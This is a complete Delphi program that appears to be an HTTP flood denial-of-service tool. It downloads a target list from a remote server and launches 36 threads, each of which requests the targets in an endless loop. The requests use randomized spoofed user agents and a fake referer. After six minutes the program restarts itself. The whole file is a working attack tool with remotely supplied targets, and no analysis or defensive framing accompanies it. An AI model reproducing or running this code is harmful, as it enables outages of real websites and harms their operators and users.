program m10;

uses
  Windows, Messages, SysUtils, Variants, Classes,ShellAPI,Tlhelp32,IdIntercept, IdInterceptThrottler,
  IdHTTP;

{$R *.res}
var
 gongjiurl, UserAgent,Userurl:string;
  idHTTP2:   TIDHttp;
  list:tstrings;
  xi:Integer;
  NewCursor :HCursor;
    ExeName:PChar;
  StartupInfo:TStartupInfo;
  ProcessInfo:TProcessInformation;
type
  TMyDownLoad=class(TThread)
  protected
  procedure   Execute;override;
  procedure   Download;
  end;

procedure   TMyDownLoad.Download; 
Var
    UnitName,PathName:String;
    MyStream:TMemoryStream;
    filepath:string;
    idHTTP1:   TIDHttp;
    IdInterceptThrottler1:TIdInterceptThrottler;
  j1,j:Integer;
  poststr:string;
  postStream : TStringStream;


begin
  Randomize;
  idHTTP1:=   TIDHTTP.Create;
//  IdInterceptThrottler1:=TIdInterceptThrottler.create();
//  IdInterceptThrottler1.BitsPerSec:=8000*1000;
//  idHTTP1.Intercept:= IdInterceptThrottler1;
  IdHTTP1.HandleRedirects:=true;
  IdHttp1.Request.UserAgent := 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A403'+inttostr(Random(999999));
  IdHttp1.AllowCookies := True;
//  IdHttp1.CookieManager := IdCookieManager1;
  IdHttp1.Request.Referer := 'http://www.716580.com';
  while 1=1 do idHTTP1.Get(list[Random(list.Count)]);
end;
procedure   TMyDownLoad.Execute;
begin
            inherited;
            Download;
end;


begin
 idHTTP2:=TIDHTTP.Create;
gongjiurl:= idHTTP2.Get('http://www.caiwuhao.com/asp.txt');
   list:=tstringlist.create;
    list.CommaText := gongjiurl;
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  Sleep(360000);
// ShellExecute(0, 'open',PChar(ParamStr(0)),nil,nil, SW_SHOWNORMAL);
  FillChar(ProcessInfo,sizeof(TProcessInformation),0);
  FillChar(StartupInfo,Sizeof(TStartupInfo),0);
  StartupInfo.cb:=Sizeof(TStartupInfo);
  StartupInfo.dwFlags:=STARTF_USESHOWWINDOW;
  StartupInfo.wShowWindow:=SW_SHOW;
  ExeName :=PChar(ParamStr(0)); //所创建进程路径
 CreateProcess(ExeName,nil,nil,nil,False,NORMAL_PRIORITY_CLASS,
    nil,nil,StartupInfo,ProcessInfo)

//WinExec(PChar('m10.exe') ,SW_SHOW);
// WinExec(PChar( ParamStr(0)) ,SW_SHOWNORMAL);
end.
